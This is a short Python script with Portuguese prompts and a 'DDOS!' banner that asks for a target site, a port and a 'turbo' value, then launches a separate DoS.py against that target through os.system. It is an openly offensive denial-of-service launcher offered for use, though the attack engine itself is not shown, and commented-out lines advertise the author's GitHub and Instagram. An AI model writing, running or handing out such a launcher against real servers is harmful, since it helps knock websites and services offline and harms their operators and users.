import os
os.system('clear')
print('''
██████╗░██████╗░░█████╗░░██████╗██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║
██║░░██║██║░░██║██║░░██║╚█████╗░██║
██║░░██║██║░░██║██║░░██║░╚═══██╗╚═╝
██████╔╝██████╔╝╚█████╔╝██████╔╝██╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚═╝''')
print('by: palahsu')

a = input('coloque o server/site que voce deseja atacar (obs: sem http):')
print('')
b = input('colque a porta:')
print('')
c = input('coloque o turbo, 135 ou 443:')
print('')
os.system('clear')
os.system(('python3 DoS.py -s {} -p {} -t {}').format (a , b , c))

#print(('python3 DoS.py -s {} -p {} -t {}') .format (a, b, c))
#print('')
#print('==========+==========')
#input('aperte enter apos copiar:')
#print ('==========+==========')
#print('')
#print('logo logo vem mais atualizações, fica esperto no meu github ou no meu insta :))')
#print('')
#print('digite o comando que voce copiou')
#print('')
#print ('===================+=+====================')